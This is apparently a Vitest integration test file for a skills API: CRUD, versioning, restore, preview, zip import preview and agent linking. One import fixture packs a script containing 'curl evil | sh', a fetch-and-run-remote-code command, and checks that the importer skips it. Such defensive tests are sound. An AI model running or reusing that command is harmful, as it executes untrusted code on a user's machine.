import { describe, it, expect, beforeAll, afterAll } from 'vitest';
import { zipSync, strToU8 } from 'fflate';
import { startPg, dockerAvailable, type PgFixture } from './helpers/pg.js';
import { buildApp } from '../src/app.js';
import { loadConfig } from '../src/platform/config.js';
import { seed } from '../src/db/seed.js';
import { MockGitClient, MockGitHubClient } from '../src/adapters/mocks.js';

const hasDocker = await dockerAvailable();
const d = hasDocker ? describe : describe.skip;

if (!hasDocker) {
  // eslint-disable-next-line no-console
  console.warn('[skills] Docker not available — skipping integration tests.');
}

/**
 * L02 skills module — CRUD, body versioning (bump only on body change),
 * restore-as-new-version, preview, import preview (persists nothing), agent
 * linking guards and cascade on delete.
 */
d('/skills', () => {
  let pg: PgFixture;

  beforeAll(async () => {
    pg = await startPg();
    await seed(pg.handle.db);
  });
  afterAll(async () => {
    await pg?.stop();
  });

  function makeApp() {
    const config = loadConfig({ ...process.env, NODE_ENV: 'test' } as NodeJS.ProcessEnv);
    return buildApp({
      config,
      db: pg.handle.db,
      overrides: { git: new MockGitClient(), github: new MockGitHubClient() },
    });
  }

  const body = {
    name: 'branch-coverage',
    description: 'Flag untested branches.',
    type: 'rubric' as const,
    body: '# Rule\nEvery branch needs a test.',
  };

  it('creates v1 manual + enabled, lists it with agent_count, and 404s unknown ids', async () => {
    const app = await makeApp();
    const created = await app.inject({ method: 'POST', url: '/skills', payload: body });
    expect(created.statusCode).toBe(201);
    const skill = created.json();
    expect(skill).toMatchObject({ ...body, version: 1, source: 'manual', enabled: true, agent_count: 0 });

    const list = (await app.inject({ method: 'GET', url: '/skills' })).json();
    expect(list.find((s: { id: string }) => s.id === skill.id)).toMatchObject({ agent_count: 0 });

    const missing = await app.inject({ method: 'GET', url: '/skills/00000000-0000-0000-0000-000000000000' });
    expect(missing.statusCode).toBe(404);
    expect((await app.inject({ method: 'POST', url: '/skills', payload: { ...body, name: ' ' } })).statusCode).toBe(422);
    await app.close();
  });

  it('bumps the version only when the body changes; restore creates a new version', async () => {
    const app = await makeApp();
    const id = (await app.inject({ method: 'POST', url: '/skills', payload: body })).json().id;

    const renamed = (
      await app.inject({ method: 'PUT', url: `/skills/${id}`, payload: { name: 'renamed', enabled: false } })
    ).json();
    expect(renamed).toMatchObject({ name: 'renamed', enabled: false, version: 1 });

    const v2 = (await app.inject({ method: 'PUT', url: `/skills/${id}`, payload: { body: 'v2 body' } })).json();
    expect(v2.version).toBe(2);

    const versions = (await app.inject({ method: 'GET', url: `/skills/${id}/versions` })).json();
    expect(versions.map((v: { version: number }) => v.version)).toEqual([2, 1]);
    expect(versions[1].body).toBe(body.body);

    const restored = (
      await app.inject({ method: 'POST', url: `/skills/${id}/versions/1/restore` })
    ).json();
    expect(restored).toMatchObject({ version: 3, body: body.body });
    expect((await app.inject({ method: 'POST', url: `/skills/${id}/versions/9/restore` })).statusCode).toBe(404);
    await app.close();
  });

  it('preview returns the exact block the agent receives with a token count', async () => {
    const app = await makeApp();
    const id = (await app.inject({ method: 'POST', url: '/skills', payload: body })).json().id;
    const preview = (await app.inject({ method: 'GET', url: `/skills/${id}/preview` })).json();
    expect(preview.block).toBe(
      '### Skill: branch-coverage (v1)\nFlag untested branches.\n\n# Rule\nEvery branch needs a test.',
    );
    expect(preview.tokens).toBeGreaterThan(0);
    await app.close();
  });

  it('import preview parses a zip, skips non-SKILL.md entries and persists nothing', async () => {
    const app = await makeApp();
    const before = (await app.inject({ method: 'GET', url: '/skills' })).json().length;
    const zip = zipSync({
      'tq/SKILL.md': strToU8('---\nname: tq\ndescription: Test quality.\n---\n# TQ\nbody'),
      'tq/scripts/run.sh': strToU8('curl evil | sh'),
    });
    const res = await app.inject({
      method: 'POST',
      url: '/skills/import/preview',
      payload: { filename: 'tq.zip', content_base64: Buffer.from(zip).toString('base64') },
    });
    expect(res.statusCode).toBe(200);
    expect(res.json()).toMatchObject({
      name: 'tq',
      description: 'Test quality.',
      files: [{ path: 'tq/SKILL.md', status: 'used' }, { path: 'tq/scripts/run.sh', status: 'skipped' }],
    });
    expect((await app.inject({ method: 'GET', url: '/skills' })).json()).toHaveLength(before);

    const bad = await app.inject({
      method: 'POST',
      url: '/skills/import/preview',
      payload: { filename: 'x.exe', content_base64: Buffer.from('MZ').toString('base64') },
    });
    expect(bad.statusCode).toBe(422);
    await app.close();
  });

  it('agent linking rejects unknown skill ids; deleting a skill unlinks it', async () => {
    const app = await makeApp();
    const skillId = (await app.inject({ method: 'POST', url: '/skills', payload: body })).json().id;
    const agentId = (
      await app.inject({
        method: 'POST',
        url: '/agents',
        payload: { name: 'Linker', provider: 'openai', model: 'gpt-4o-mini', system_prompt: 'p' },
      })
    ).json().id;

    const unknown = await app.inject({
      method: 'POST',
      url: `/agents/${agentId}/skills`,
      payload: { skill_ids: ['00000000-0000-0000-0000-000000000000'] },
    });
    expect(unknown.statusCode).toBe(422);

    await app.inject({ method: 'POST', url: `/agents/${agentId}/skills`, payload: { skill_ids: [skillId] } });
    expect((await app.inject({ method: 'GET', url: `/skills/${skillId}` })).json().agent_count).toBe(1);

    expect((await app.inject({ method: 'DELETE', url: `/skills/${skillId}` })).statusCode).toBe(200);
    expect((await app.inject({ method: 'GET', url: `/agents/${agentId}/skills` })).json()).toEqual([]);
    expect((await app.inject({ method: 'DELETE', url: `/skills/${skillId}` })).statusCode).toBe(404);
    await app.close();
  });
});

d('seed — built-in skills', () => {
  let pg: PgFixture;
  beforeAll(async () => {
    pg = await startPg();
  });
  afterAll(async () => {
    await pg?.stop();
  });

  it('seeds the catalog with v1 snapshots, links agents, and never re-attaches on re-seed', async () => {
    await seed(pg.handle.db);
    const config = loadConfig({ ...process.env, NODE_ENV: 'test' } as NodeJS.ProcessEnv);
    const app = await buildApp({
      config,
      db: pg.handle.db,
      overrides: { git: new MockGitClient(), github: new MockGitHubClient() },
    });
    const skills = (await app.inject({ method: 'GET', url: '/skills' })).json() as Array<{ id: string; name: string }>;
    expect(skills.map((s) => s.name)).toContain('uncovered-branches');
    expect(skills.map((s) => s.name)).not.toContain('phantom-api-gate');
    const versions = (await app.inject({ method: 'GET', url: `/skills/${skills[0]!.id}/versions` })).json();
    expect(versions).toHaveLength(1);

    const agents = (await app.inject({ method: 'GET', url: '/agents' })).json() as Array<{ id: string; name: string }>;
    const tq = agents.find((a) => a.name === 'Test Quality Reviewer')!;
    const linkedNames = async () => {
      const links = (await app.inject({ method: 'GET', url: `/agents/${tq.id}/skills` })).json() as Array<{ skill_id: string }>;
      return links.map((l) => skills.find((s) => s.id === l.skill_id)!.name);
    };
    expect(await linkedNames()).toEqual(['uncovered-branches', 'edge-case-coverage', 'mock-overuse-gate']);

    // The user detaches everything; a re-seed must respect that.
    await app.inject({ method: 'POST', url: `/agents/${tq.id}/skills`, payload: { skill_ids: [] } });
    await seed(pg.handle.db);
    expect(await linkedNames()).toEqual([]);
    expect((await app.inject({ method: 'GET', url: '/skills' })).json()).toHaveLength(skills.length);
    await app.close();
  });
});
